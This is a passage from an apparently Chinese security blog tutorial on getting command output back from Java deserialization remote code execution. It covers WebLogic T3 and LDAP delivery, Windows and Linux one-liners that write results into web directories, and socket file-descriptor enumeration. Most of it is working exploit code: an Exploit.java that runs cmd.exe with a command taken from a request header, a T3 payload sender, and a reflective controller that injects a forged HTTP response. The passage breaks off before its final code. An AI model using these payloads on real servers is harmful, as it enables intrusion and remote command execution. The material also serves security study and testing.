objOut.writeObject(obj);</span><br><span class="line">        objOut.flush();</span><br><span class="line">        objOut.close();</span><br><span class="line">        <span class="keyword">byte</span>[] payload = out.toByteArray();</span><br><span class="line">        <span class="comment">// t3发送</span></span><br><span class="line">        T3ProtocolOperation.send(host, port, payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] getBs() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        File file=<span class="keyword">new</span> File(<span class="string">"C:\\Users\\admin\\Desktop\\RMITest.class"</span>);</span><br><span class="line">        Long filelength = file.length(); <span class="comment">// 获取文件长度</span></span><br><span class="line">        BufferedInputStream bis = <span class="keyword">null</span>;</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        FileInputStream in =<span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        bis = <span class="keyword">new</span> BufferedInputStream(in);</span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len = in.read(buf)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(buf, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">byte</span>[] buffer = baos.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> buffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221135505051.png" alt="image-20201221135505051"></p>
<h3 id="WebLogic回显"><a href="#WebLogic回显" class="headerlink" title="WebLogic回显"></a>WebLogic回显</h3><p>​        根据lufei在<code>weblogic_2019_2725poc与回显构造</code>中的分析，可以通过获取当前请求线程中的header和response对象，在header中获取请求参数，在response中通过<code>response.getOutputStream().write(&quot;xxxx&quot;);</code> 来获取命令执行的结果,代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String lfcmd = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(<span class="string">"lfcmd"</span>);</span><br><span class="line">weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();</span><br><span class="line">weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();</span><br><span class="line">outputStream.writeStream(<span class="keyword">new</span> weblogic.xml.util.StringInputStream(lfcmd));</span><br><span class="line">outputStream.flush();</span><br><span class="line">response.getWriter().write(<span class="string">""</span>);</span><br></pre></td></tr></table></figure>

<p>​        这种获取回显的方法也可以配合到LDAP和RMI等协议获取回显的方式中，首先我们编写一个Exploit.java内容如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String lfcmd = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(<span class="string">"lfcmd"</span>);</span><br><span class="line">        String[] cmds = <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, lfcmd&#125;;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">        String output = s.hasNext() ? s.next() : <span class="string">""</span>;</span><br><span class="line">        weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();</span><br><span class="line">        weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();</span><br><span class="line">        outputStream.writeStream(<span class="keyword">new</span> weblogic.xml.util.StringInputStream(output));</span><br><span class="line">        outputStream.flush();</span><br><span class="line">        response.getWriter().write(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​     在自己的VPS上开启LDAP服务，执行结果如下</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221152936908.png" alt="image-20201221152936908"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221152826165.png" alt="image-20201221152826165"></p>
<h3 id="Windows回显"><a href="#Windows回显" class="headerlink" title="Windows回显"></a>Windows回显</h3><h4 id="执行结果写入web目录"><a href="#执行结果写入web目录" class="headerlink" title="执行结果写入web目录"></a>执行结果写入web目录</h4><p>​        当我们在一些web网站测试过程中遇到了没有回显的命令执行漏洞，可以通过将命令执行结果写入到web目录下的文件的方式获取回显，首先要解决一个问题是怎么才能找到当前网站的目录呢？可以通过<code>dir /s /b e:\web.xml</code>这种方式获取e盘下所有的web.xml的目录。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221162728556.png" alt="image-20201221162728556"></p>
<p>​        其次我们可以将我们命令执行的结果循环写入到找到的这些文件的目录中，利用代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &#x2F;c &quot;for &#x2F;f %i in (&#39;dir &#x2F;s &#x2F;b e:tomcat.css&#39;) do (echo %i&gt; %i.path.txt) &amp; (ipconfig &gt; %i.cmd.txt)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221162905061.png" alt="image-20201221162905061"></p>
<p>​        如果是通过GET方式进行利用，需要将请求的内容编码，否则会下入不成功。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221163149040.png" alt="image-20201221163149040"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221163227146.png" alt="image-20201221163227146"></p>
<p>​        由于使用这种方式写入回显会向匹配到的结果循环写入文件，所以我们在选择要匹配的文件名的时候，尽量选择一些不容易和其他项目重复的文件名。</p>
<h4 id="socket文件描述符回显"><a href="#socket文件描述符回显" class="headerlink" title="socket文件描述符回显"></a>socket文件描述符回显</h4><p>​        对服务端发起请求时会对应一个socket的文件描述符，我们可以获得当前请求的文件描述符，并在相应中写入回显内容。使用这种方法我们需要明白两个问题</p>
<ul>
<li><p>如何在java中获取当前的socket文件描述符？</p>
<p>目前没有比较好的方法可以获取到当前请求的文件描述符,一般是通过暴力枚举文件操作符，再通过某些方式判断枚举的文件描述符是否有效，可以通过sun.nio.ch.Net#remoteAddress验证文件操作符是否有效，最后通过一些条件比如请求IP来过滤文件操作符是否来自于本次请求。</p>
</li>
<li><p>如何向socket文件描述符写入数据？</p>
<p>可以通过FileOutputStream或其子类写入回显数据。</p>
<p>参考<code>https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Windows/code/WindowsEcho.jsp</code>测试类，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/test"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, NoSuchMethodException, ClassNotFoundException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(java.io.File.separator.equals(<span class="string">"\\"</span>))&#123;</span><br><span class="line">            java.lang.reflect.Field field = java.io.FileDescriptor.class.getDeclaredField("fd");</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            Class clazz1 = Class.forName(<span class="string">"sun.nio.ch.Net"</span>);</span><br><span class="line">            java.lang.reflect.Method method1 = clazz1.getDeclaredMethod(<span class="string">"remoteAddress"</span>,<span class="keyword">new</span> Class[]&#123;java.io.FileDescriptor<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">            method1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            Class clazz2 = Class.forName(<span class="string">"java.net.SocketOutputStream"</span>, <span class="keyword">false</span>, <span class="keyword">null</span>);</span><br><span class="line">            java.lang.reflect.Constructor constructor2 = clazz2.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">            constructor2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            Class clazz3 = Class.forName(<span class="string">"java.net.PlainSocketImpl"</span>);</span><br><span class="line">            java.lang.reflect.Constructor constructor3 = clazz3.getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;java.io.FileDescriptor<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">            constructor3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            java.lang.reflect.Method write = clazz2.getDeclaredMethod(<span class="string">"write"</span>,<span class="keyword">new</span> Class[]&#123;<span class="keyword">byte</span>[]<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">            write.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            java.net.InetSocketAddress remoteAddress = <span class="keyword">null</span>;</span><br><span class="line">            java.util.List list = <span class="keyword">new</span> java.util.ArrayList();</span><br><span class="line">            java.io.FileDescriptor fileDescriptor = <span class="keyword">new</span> java.io.FileDescriptor();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++)&#123;</span><br><span class="line">                field.set((Object)fileDescriptor, (Object)(<span class="keyword">new</span> Integer(i)));</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    remoteAddress= (java.net.InetSocketAddress) method1.invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;fileDescriptor&#125;);</span><br><span class="line">                    <span class="keyword">if</span>(remoteAddress.toString().startsWith(<span class="string">"/127.0.0.1"</span>)) <span class="keyword">continue</span>;</span><br><span class="line">                    <span class="keyword">if</span>(remoteAddress.toString().startsWith(<span class="string">"/0:0:0:0:0:0:0:1"</span>)) <span class="keyword">continue</span>;</span><br><span class="line">                    list.add(<span class="keyword">new</span> Integer(i));</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = list.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    field.set((Object)fileDescriptor, list.get(i));</span><br><span class="line">                    Object socketOutputStream = constructor2.newInstance(<span class="keyword">new</span> Object[]&#123;constructor3.newInstance(<span class="keyword">new</span> Object[]&#123;fileDescriptor&#125;)&#125;);</span><br><span class="line">                    String[] cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>,<span class="string">"/C"</span>, <span class="string">"whoami"</span>&#125;;</span><br><span class="line">                    String res = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">"\\A"</span>).next().trim();</span><br><span class="line">                    String result = <span class="string">"HTTP/1.1 200 OK\nConnection: close\nContent-Length: "</span> + (res.length()) + <span class="string">"\n\n"</span> + res + <span class="string">"\n\n"</span>;</span><br><span class="line">                    write.invoke(socketOutputStream, <span class="keyword">new</span> Object[]&#123;result.getBytes()&#125;);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    <span class="comment">//pass</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221183135520.png" alt="image-20201221183135520"></p>
<p>​    我将上面的代码分为几段来讲解,先看一下第一段的代码，代码的说明我会写到注释中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field field =java.io.FileDescriptor.class.getDeclaredField("fd");  //通过反射获取FileDescriptor的fd属性，</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);  <span class="comment">//由于fd属性是private，因此需要设置访问权限才能正常使用</span></span><br><span class="line">Class clazz1 = Class.forName(<span class="string">"sun.nio.ch.Net"</span>); <span class="comment">//获取Net类的Class对象</span></span><br><span class="line">java.lang.reflect.Method method1 = clazz1.getDeclaredMethod(<span class="string">"remoteAddress"</span>,<span class="keyword">new</span> Class[]&#123;java.io.FileDescriptor<span class="class">.<span class="keyword">class</span>&#125;)</span>; <span class="comment">//获取sun.nio.ch.Net#remoteAddress方法</span></span><br><span class="line">method1.setAccessible(<span class="keyword">true</span>); <span class="comment">//由于remoteAddress方法不是public所以需要设置访问权限才能调用</span></span><br><span class="line">java.net.InetSocketAddress remoteAddress = <span class="keyword">null</span>;</span><br><span class="line">java.util.List list = <span class="keyword">new</span> java.util.ArrayList(); <span class="comment">//创建一个list列表，用来存储可以满足需求的文件描述符ID</span></span><br><span class="line">java.io.FileDescriptor fileDescriptor = <span class="keyword">new</span> java.io.FileDescriptor(); <span class="comment">//创建fileDescriptor对象</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++)&#123; <span class="comment">//循环遍历文件描述符ID</span></span><br><span class="line">          field.set((Object)fileDescriptor, (Object)(<span class="keyword">new</span> Integer(i)));<span class="comment">//设置fd属性的值为i</span></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">    remoteAddress= (java.net.InetSocketAddress) method1.invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;fileDescriptor&#125;); <span class="comment">//通过反射调用sun.nio.ch.Net#remoteAddress方法，并传入fileDescriptor对象。</span></span><br><span class="line">    <span class="keyword">if</span>(remoteAddress.toString().startsWith(<span class="string">"/127.0.0.1"</span>)) <span class="keyword">continue</span>; <span class="comment">//当通过remoteAddress获取的内容包含127.0.0.1是，也就是这个请求时127.0.0.1则排除</span></span><br><span class="line">    <span class="keyword">if</span>(remoteAddress.toString().startsWith(<span class="string">"/0:0:0:0:0:0:0:1"</span>)) <span class="keyword">continue</span>;</span><br><span class="line">      list.add(<span class="keyword">new</span> Integer(i)); <span class="comment">//满足条件则添加</span></span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>​        我们看一下remoteAddress是如何验证socket是否存在的？</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221193820631.png" alt="image-20201221193820631"></p>
<p>​    在remoteInetAddress方法中，会通过我们传入的FileDescriptor的值判断socket是否存在，当不存在是会抛出socket异常。</p>
</li>
</ul>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221193915547.png" alt="image-20201221193915547"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221194018415.png" alt="image-20201221194018415"></p>
<p>​        remoteInetAddress的实现在native层，也就是C来实现的，如果想要查看对应的C代码可以下载Openjdk来查看，remoteInetAddress的实现代码如下，在remoteInetAddress中会调用getpeername来获取socket的ip和端口号，获取失败则会pa</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222095043479.png" alt="image-20201222095043479"></p>
<p>​        如果remoteInetAddress方法可以正常获取，则返回InetSocketAddressHolder对象，在这个对象中包含hostname,addr,port等信息。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221194132910.png" alt="image-20201221194132910"></p>
<p>​        我们再看下第二段代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Class clazz2 = Class.forName(<span class="string">"java.net.SocketOutputStream"</span>, <span class="keyword">false</span>, <span class="keyword">null</span>);</span><br><span class="line">java.lang.reflect.Constructor constructor2 = clazz2.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor2.setAccessible(<span class="keyword">true</span>); <span class="comment">//通过反射调用获取SocketOutputStream的构造器</span></span><br><span class="line"></span><br><span class="line">Class clazz3 = Class.forName(<span class="string">"java.net.PlainSocketImpl"</span>);</span><br><span class="line">java.lang.reflect.Constructor constructor3 = clazz3.getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;java.io.FileDescriptor<span class="class">.<span class="keyword">class</span>&#125;)</span>; <span class="comment">//通过反射获取PlainSocketImpl的有参构造器。</span></span><br><span class="line">constructor3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">java.lang.reflect.Method write = clazz2.getDeclaredMethod(<span class="string">"write"</span>,<span class="keyword">new</span> Class[]&#123;<span class="keyword">byte</span>[]<span class="class">.<span class="keyword">class</span>&#125;)</span>;  <span class="comment">//调用java.net.SocketOutputStream#write方法，并传入byte[]数组</span></span><br><span class="line"> write.setAccessible(<span class="keyword">true</span>); <span class="comment">//更改write方法的访问权限</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = list.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123; <span class="comment">//循环向所有满足条件的socket中写入命令执行的结果。</span></span><br><span class="line">     <span class="keyword">try</span>&#123;</span><br><span class="line">       field.set((Object)fileDescriptor, list.get(i)); <span class="comment">//设置fileDescriptor的fd属性</span></span><br><span class="line"> Object socketOutputStream = constructor2.newInstance(<span class="keyword">new</span> Object[]&#123;constructor3.newInstance(<span class="keyword">new</span> Object[]&#123;fileDescriptor&#125;)&#125;); <span class="comment">//通过反射创建socketOutputStream实例并传入PlainSocketImpl的实例。</span></span><br><span class="line">     String[] cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>,<span class="string">"/C"</span>, <span class="string">"whoami"</span>&#125;;  </span><br><span class="line">     String res = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">"\\A"</span>).next().trim(); <span class="comment">//命令执行结果</span></span><br><span class="line">     String result = <span class="string">"HTTP/1.1 200 OK\nConnection: close\nContent-Length: "</span> + (res.length()) + <span class="string">"\n\n"</span> + res + <span class="string">"\n\n"</span>;  <span class="comment">//将命令执行的结果和响应头的部分拼接</span></span><br><span class="line">      write.invoke(socketOutputStream, <span class="keyword">new</span> Object[]&#123;result.getBytes()&#125;);</span><br><span class="line">                    <span class="keyword">break</span>; <span class="comment">//调用socketOutputStream的write方法写入命令执行结果。</span></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    <span class="comment">//pass</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>​        socketOutputStream的构造参数需要传入AbstractPlainSocketImpl类型的参数。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221200058463.png" alt="image-20201221200058463"></p>
<p>​        而PlainSocketImpl是AbstractPlainSocketImpl的子类，因此其返回的实例可以作为socketOutputStream的参数传入。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221200144137.png" alt="image-20201221200144137"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221200243072.png" alt="image-20201221200243072"></p>
<p>​        为什么我们的写入socket数据的时候需要加入HTTP响应头？</p>
<p>​        我们抓包进行分析，可以看到我们写入的内容在真实的请求头之前，所以在我们写入数据时需要先添加一个请求头避免无法正常响应。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221200405698.png" alt="image-20201221200405698"></p>
<h3 id="Linux回显"><a href="#Linux回显" class="headerlink" title="Linux回显"></a>Linux回显</h3><h4 id="执行结果写入web目录-1"><a href="#执行结果写入web目录-1" class="headerlink" title="执行结果写入web目录"></a>执行结果写入web目录</h4><p>​        这种实现方法和windows的方法类似，也是通过查找某些指定的文件名的位置，并将命令执行的结果写入到找到的文件目录中,运行如下命令，可以将命令执行的结果写入到web.xml同级目录下的test.txt中</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name web.xml|while read f;do sh -c 'id;pwd;ifconfig' &gt;$(dirname $f)/test.txt;done</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222102651892.png" alt="image-20201222102651892"></p>
<h4 id="socket文件描述符回显-1"><a href="#socket文件描述符回显-1" class="headerlink" title="socket文件描述符回显"></a>socket文件描述符回显</h4><p>​        在Linux中，可以通过命令来查看文件描述符从而获取到socket的连接信息,<code>cat /proc/net/tcp</code></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222110758528.png" alt="image-20201222110758528"></p>
<p>​        假如我们通过<code>nc -lvvp 8888</code>开启一个监听，我们如何找到对应的socket连接，首先<code>ps -elf|grep nc</code> 找到监听对应的进程ID。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222145124269.png" alt="image-20201222145124269"></p>
<pre><code>根据进程ID找到对应的socket文件，socket后的数字代表INode</code></pre><p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222145240659.png" alt="image-20201222145240659"></p>
<p>​        最后，我们就可以根据找到的Inode的信息找到对应的socket，<code>cat /proc/net/tcp|grep 2664048</code>并且可以获取源端口和地址还有目的端口和地址。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222145717578.png" alt="image-20201222145717578"></p>
<p>​        我们也可以根据请求的端口来找到对应的socket的Inode <code>cat /proc/net/tcp|awk &#39;{if($10&gt;0)print}&#39;|grep -i 125D|awk &#39;{print $10}&#39;</code></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222151828714.png" alt="image-20201222151828714"></p>
<p>​        再根据Inode和进程id来获取fd也就是socket文件描述符的值<code>ls -l /proc/32591/fd|grep 2664048|awk &#39;{print $9}&#39;</code>。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222151905568.png" alt="image-20201222151905568"></p>
<p>​        我们分析一下<code>https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Linux/code/case2.jsp</code>的实现,首先看一下执行结果，基本上可以稳定的获取到回显的结果。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222152243073.png" alt="image-20201222152243073"></p>
<p>​        代码实现如下：</p>
